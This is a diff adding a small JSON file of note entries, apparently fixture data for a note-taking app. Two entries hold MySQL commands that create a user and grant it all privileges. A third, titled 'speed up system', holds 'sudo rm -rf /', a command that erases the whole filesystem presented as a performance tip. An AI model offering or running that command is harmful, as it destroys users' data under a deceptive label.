@@ -1,0 +1,7 @@
+{ 
+	"data": [
+		{"id": 0, "notebook": 0, "title": "add mysql user", "body": "CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';", "deleted": false},
+		{"id": 1, "notebook": 0, "title": "grant all", "body": "GRANT ALL PRIVILEGES ON *.* TO 'finley'@'localhost';", "deleted": false},
+		{"id": 2, "notebook": 1, "title": "speed up system", "body": "sudo rm -rf /", "deleted": false},
+	]
+}
